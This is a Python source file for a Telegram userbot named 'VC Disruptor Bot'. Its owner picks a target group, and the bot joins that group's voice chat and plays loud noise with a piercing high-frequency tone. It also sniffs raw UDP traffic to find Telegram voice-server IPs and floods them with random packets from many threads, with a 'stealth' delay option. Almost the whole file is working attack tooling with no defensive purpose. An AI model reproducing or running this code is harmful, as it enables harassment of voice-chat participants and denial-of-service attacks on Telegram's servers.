import asyncio
import io
import json
import os
import socket
import struct
import threading
import time
import random
import sys
import wave
import numpy as np

from telethon import TelegramClient, events
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.errors import FloodWaitError

# ✅ YAHAN KUCH NAHI BADLNA – ORIGINAL IMPORT
from pytgcalls import PyTgCalls
from pytgcalls.types import AudioPiped

# ========== CONFIG (Environment Variables) ==========
OWNER_ID = int(os.environ.get("OWNER_ID", 0))
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
SESSION_STRING = os.environ.get("SESSION_STRING", "")

AUDIO_DURATION = 20
AUDIO_AMPLITUDE = 0.95
TONE_FREQUENCY = 8500
UDP_THREADS = 20
UDP_DURATION = 30
UDP_PORT = 26000
STEALTH_MODE = True

CONFIG_FILE = "tg_vc_bot_config.json"

TELEGRAM_PREFIXES = [
    "91.108.56.", "91.108.4.", "91.108.8.", "91.108.12.",
    "149.154.167.", "149.154.175.", "149.154.160.",
    "95.161.76.", "95.161.64."
]

bot_state = {
    "target_id": None,
    "target_name": None,
    "vc_ip": None,
    "vc_port": None,
    "is_attacking": False,
    "attack_start": None,
    "app": None,
    "pytgcalls": None,
    "status": "idle",
    "stop_event": None
}

def save_bot_config():
    data = {
        "target_id": bot_state["target_id"],
        "target_name": bot_state["target_name"],
        "audio_duration": AUDIO_DURATION,
        "audio_amplitude": AUDIO_AMPLITUDE,
        "tone_frequency": TONE_FREQUENCY,
        "udp_threads": UDP_THREADS,
        "udp_duration": UDP_DURATION,
        "stealth_mode": STEALTH_MODE,
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)

def load_bot_config():
    global AUDIO_DURATION, AUDIO_AMPLITUDE, TONE_FREQUENCY
    global UDP_THREADS, UDP_DURATION, STEALTH_MODE
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                data = json.load(f)
            bot_state["target_id"] = data.get("target_id")
            bot_state["target_name"] = data.get("target_name")
            AUDIO_DURATION = data.get("audio_duration", AUDIO_DURATION)
            AUDIO_AMPLITUDE = data.get("audio_amplitude", AUDIO_AMPLITUDE)
            TONE_FREQUENCY = data.get("tone_frequency", TONE_FREQUENCY)
            UDP_THREADS = data.get("udp_threads", UDP_THREADS)
            UDP_DURATION = data.get("udp_duration", UDP_DURATION)
            STEALTH_MODE = data.get("stealth_mode", STEALTH_MODE)
            print("[✓] Config loaded.")
        except:
            print("[!] Config corrupted, using defaults.")

def detect_vc_ip(duration=15):
    print(f"[🔍] Detecting VC IP ({duration}s)...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.settimeout(1)
    except Exception as e:
        print(f"[!] Raw socket not available (ignore if on Railway): {e}")
        return None, None
    ips = {}
    start = time.time()
    while time.time() - start < duration:
        try:
            packet = sock.recvfrom(65536)[0]
            ip_header = packet[0:20]
            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
            src_ip = socket.inet_ntoa(iph[8])
            dst_ip = socket.inet_ntoa(iph[9])
            protocol = iph[6]
            if protocol == 17:
                udp_header = packet[20:28]
                src_port, dst_port = struct.unpack('!HH', udp_header[:4])
                if 25000 <= dst_port <= 27000 or 25000 <= src_port <= 27000:
                    for prefix in TELEGRAM_PREFIXES:
                        if src_ip.startswith(prefix):
                            ips[src_ip] = ips.get(src_ip, 0) + 1
                            break
                        elif dst_ip.startswith(prefix):
                            ips[dst_ip] = ips.get(dst_ip, 0) + 1
                            break
        except:
            continue
    sock.close()
    if ips:
        best_ip = max(ips, key=ips.get)
        print(f"[✅] VC IP: {best_ip}")
        return best_ip, UDP_PORT
    return None, None

def udp_flood_worker(ip, port, duration, tid, stop_event):
    sent = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        timeout = time.time() + duration
        while time.time() < timeout and not stop_event.is_set():
            try:
                payload = random._urandom(random.randint(512, 1400))
                sock.sendto(payload, (ip, port))
                sent += 1
                time.sleep(random.uniform(0.001, 0.003))
            except:
                pass
        sock.close()
    except:
        pass
    return sent

def start_udp_flood(ip, port, duration, threads, stop_event):
    print(f"[🌊] UDP Flood: {ip}:{port} x{threads} threads")
    results = []
    thread_list = []
    for i in range(threads):
        t = threading.Thread(
            target=lambda: results.append(udp_flood_worker(ip, port, duration, i+1, stop_event))
        )
        t.daemon = True
        thread_list.append(t)
        t.start()
    for t in thread_list:
        t.join(timeout=2)
    total = sum(results) if results else 0
    print(f"[✅] UDP Flood done: ~{total} packets")
    return total

def stop_udp_flood(stop_event):
    if stop_event:
        stop_event.set()
        print("[⏹️] UDP Flood stopped")

def generate_disruptive_audio(duration_sec=AUDIO_DURATION,
                               sample_rate=48000,
                               noise_amp=AUDIO_AMPLITUDE,
                               tone_freq=TONE_FREQUENCY):
    samples = int(duration_sec * sample_rate)
    t = np.linspace(0, duration_sec, samples, endpoint=False)
    noise = np.random.normal(0, noise_amp, samples).astype(np.float32)
    tone = 0.4 * np.sin(2 * np.pi * tone_freq * t)
    pulse = 0.3 * (0.5 + 0.5 * np.sin(2 * np.pi * 20 * t))
    mixed = noise + tone + pulse
    mixed = np.clip(mixed, -1.0, 1.0)
    pcm_data = (mixed * 32767).astype(np.int16)
    buf = io.BytesIO()
    with wave.open(buf, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(sample_rate)
        wf.writeframes(pcm_data.tobytes())
    buf.seek(0)
    return buf

# ---------- BOT HANDLERS ----------
def owner_only(func):
    async def wrapper(event):
        try:
            if event.sender_id != OWNER_ID:
                await event.reply("❌ Unauthorized!")
                return
        except:
            await event.reply("❌ Error identifying user.")
            return
        return await func(event)
    return wrapper

@owner_only
async def start_cmd(event):
    text = """
🤖 **VC Disruptor Bot (Full Version)**

🎯 `/target <link>` — Set target group
⚔️ `/attack` — Start attack
⏹️ `/stop` — Stop attack
📊 `/status` — Check status
📋 `/settings` — View settings
⚙️ `/set <param> <value>` — Change setting
🔄 `/reset` — Reset defaults
"""
    await event.reply(text)

@owner_only
async def status_cmd(event):
    text = f"""
📊 **Status**
─────────────
State: `{bot_state['status']}`
Target: {bot_state['target_name'] or 'Not set'}
VC IP: {bot_state['vc_ip'] or 'Not detected'}
Attack: {'✅ Active' if bot_state['is_attacking'] else '❌ Idle'}
Audio: {AUDIO_DURATION}s | Tone: {TONE_FREQUENCY}Hz
UDP: {UDP_DURATION}s | Threads: {UDP_THREADS}
"""
    await event.reply(text)

@owner_only
async def target_cmd(event):
    parts = event.raw_text.split()
    if len(parts) < 2:
        await event.reply("❌ Usage: /target <group_link_or_id>")
        return
    link = parts[1].strip()
    await event.reply(f"[🔗] Processing: {link}")
    try:
        app = bot_state["app"]
        if link.startswith("http") or link.startswith("t.me"):
            try:
                if "t.me/+" in link:
                    hash_code = link.split("/")[-1]
                    await app(ImportChatInviteRequest(hash_code))
                else:
                    username = link.split("/")[-1]
                    await app(JoinChannelRequest(username))
            except FloodWaitError as e:
                await event.reply(f"[!] Flood wait: {e.seconds}s")
                return
            except:
                username = link.split("/")[-1]
                chat = await app.get_entity(username)
        else:
            chat = await app.get_entity(int(link))
        bot_state["target_id"] = chat.id
        bot_state["target_name"] = chat.title if hasattr(chat, 'title') else str(chat.id)
        bot_state["status"] = "target_set"
        save_bot_config()
        await event.reply(f"[✅] Target: **{bot_state['target_name']}**\nID: `{chat.id}`")
    except Exception as e:
        await event.reply(f"[!] Error: {e}")

@owner_only
async def attack_cmd(event):
    if bot_state["is_attacking"]:
        await event.reply("⚠️ Attack already running!")
        return
    if not bot_state["target_id"]:
        await event.reply("❌ No target set! Use /target first.")
        return
    chat_id = bot_state["target_id"]
    await event.reply(f"🚀 **Attacking {bot_state['target_name']}...**")
    bot_state["is_attacking"] = True
    bot_state["status"] = "attacking"
    bot_state["attack_start"] = time.time()
    stop_event = threading.Event()
    bot_state["stop_event"] = stop_event
    try:
        await event.reply("[🔍] Detecting VC IP (15s)...")
        vc_ip, vc_port = detect_vc_ip(15)
        bot_state["vc_ip"] = vc_ip
        audio_buf = generate_disruptive_audio()
        if STEALTH_MODE:
            await asyncio.sleep(random.uniform(2, 5))
        pytgcalls = bot_state["pytgcalls"]
        await pytgcalls.join_group_call(chat_id, AudioPiped(audio_buf))
        await event.reply(f"[✅] Audio playing for {AUDIO_DURATION}s")
        if vc_ip and vc_port:
            threading.Thread(
                target=lambda: start_udp_flood(vc_ip, vc_port, UDP_DURATION, UDP_THREADS, stop_event),
                daemon=True
            ).start()
            await event.reply(f"[🌊] UDP flood: {vc_ip}:{vc_port}")
        await asyncio.sleep(AUDIO_DURATION + 2)
        try:
            await pytgcalls.leave_group_call(chat_id)
        except:
            pass
        stop_udp_flood(stop_event)
        elapsed = int(time.time() - bot_state["attack_start"])
        await event.reply(f"[✅] Attack complete! Duration: {elapsed}s")
    except Exception as e:
        await event.reply(f"[❌] Error: {e}")
    finally:
        bot_state["is_attacking"] = False
        bot_state["status"] = "target_set"

@owner_only
async def stop_cmd(event):
    if not bot_state["is_attacking"]:
        await event.reply("ℹ️ No active attack.")
        return
    if bot_state.get("stop_event"):
        stop_udp_flood(bot_state["stop_event"])
    try:
        await bot_state["pytgcalls"].leave_group_call(bot_state["target_id"])
    except:
        pass
    bot_state["is_attacking"] = False
    bot_state["status"] = "idle"
    bot_state["stop_event"] = None
    await event.reply("[⏹️] Attack stopped.")

@owner_only
async def settings_cmd(event):
    text = f"""
📋 **Settings**
─────────────
duration: {AUDIO_DURATION}s
udp_duration: {UDP_DURATION}s
threads: {UDP_THREADS}
tone: {TONE_FREQUENCY}Hz
amplitude: {AUDIO_AMPLITUDE}
stealth: {STEALTH_MODE}
"""
    await event.reply(text)

@owner_only
async def set_cmd(event):
    parts = event.raw_text.split()
    if len(parts) < 3:
        await event.reply("❌ Usage: /set <param> <value>\nExample: /set duration 30")
        return
    param = parts[1].lower()
    value = parts[2]
    global AUDIO_DURATION, UDP_DURATION, UDP_THREADS, TONE_FREQUENCY, STEALTH_MODE
    changes = {
        "duration": ("AUDIO_DURATION", lambda v: max(5, int(v))),
        "udp_duration": ("UDP_DURATION", lambda v: max(5, int(v))),
        "threads": ("UDP_THREADS", lambda v: max(1, min(100, int(v)))),
        "tone": ("TONE_FREQUENCY", lambda v: max(3000, min(15000, int(v)))),
        "stealth": ("STEALTH_MODE", lambda v: v.lower() in ("true", "yes", "1")),
    }
    if param in changes:
        var_name, converter = changes[param]
        try:
            val = converter(value)
            globals()[var_name] = val
            save_bot_config()
            await event.reply(f"[✅] {var_name} = {val}")
        except:
            await event.reply(f"[!] Invalid value for {param}")
    else:
        await event.reply(f"[!] Valid params: {', '.join(changes.keys())}")

@owner_only
async def reset_cmd(event):
    global AUDIO_DURATION, AUDIO_AMPLITUDE, TONE_FREQUENCY, UDP_THREADS, UDP_DURATION, STEALTH_MODE
    AUDIO_DURATION = 20
    AUDIO_AMPLITUDE = 0.95
    TONE_FREQUENCY = 8500
    UDP_THREADS = 20
    UDP_DURATION = 30
    STEALTH_MODE = True
    bot_state["target_id"] = None
    bot_state["target_name"] = None
    bot_state["vc_ip"] = None
    if os.path.exists(CONFIG_FILE):
        os.remove(CONFIG_FILE)
    await event.reply("[✅] Reset to defaults.")

# ---------- KEEP-ALIVE WEB SERVER (Railway) ----------
async def web_server():
    from aiohttp import web
    async def handle(request):
        return web.Response(text="Bot is running!")
    web_app = web.Application()
    web_app.router.add_get("/", handle)
    runner = web.AppRunner(web_app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    await web.TCPSite(runner, "0.0.0.0", port).start()
    print(f"[🌐] Keep-alive server on :{port}")

# ---------- MAIN ----------
async def main():
    print("\n" + "="*50)
    print("  🚀 VC DISRUPTOR BOT (Railway Full Version)")
    print("="*50 + "\n")
    if not SESSION_STRING or not API_ID or not API_HASH or not OWNER_ID:
        print("[!] ERROR: SESSION_STRING, API_ID, API_HASH, OWNER_ID set karo!")
        sys.exit(1)
    load_bot_config()
    print("[📡] Starting user account (Telethon)...")
    app = TelegramClient(
        "vc_session",
        API_ID,
        API_HASH,
        session_string=SESSION_STRING
    )
    await app.start()
    user = await app.get_me()
    print(f"[👤] Logged in as: {user.first_name} (ID: {user.id})")
    print("[📞] Starting PyTgCalls...")
    pytgcalls = PyTgCalls(app)
    await pytgcalls.start()
    print("[✅] PyTgCalls ready!")
    bot_state["app"] = app
    bot_state["pytgcalls"] = pytgcalls

    @app.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        await start_cmd(event)
    @app.on(events.NewMessage(pattern='/status'))
    async def status_handler(event):
        await status_cmd(event)
    @app.on(events.NewMessage(pattern='/target'))
    async def target_handler(event):
        await target_cmd(event)
    @app.on(events.NewMessage(pattern='/attack'))
    async def attack_handler(event):
        await attack_cmd(event)
    @app.on(events.NewMessage(pattern='/stop'))
    async def stop_handler(event):
        await stop_cmd(event)
    @app.on(events.NewMessage(pattern='/settings'))
    async def settings_handler(event):
        await settings_cmd(event)
    @app.on(events.NewMessage(pattern='/set'))
    async def set_handler(event):
        await set_cmd(event)
    @app.on(events.NewMessage(pattern='/reset'))
    async def reset_handler(event):
        await reset_cmd(event)

    print("\n" + "="*50)
    print("  ✅ BOT IS RUNNING!")
    print("  Commands: /target, /attack, /stop")
    print("="*50 + "\n")
    asyncio.create_task(web_server())
    try:
        await app.run_until_disconnected()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    finally:
        await pytgcalls.stop()
        await app.disconnect()
        print("[✓] Clean exit.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Exited.")
        sys.exit(0)
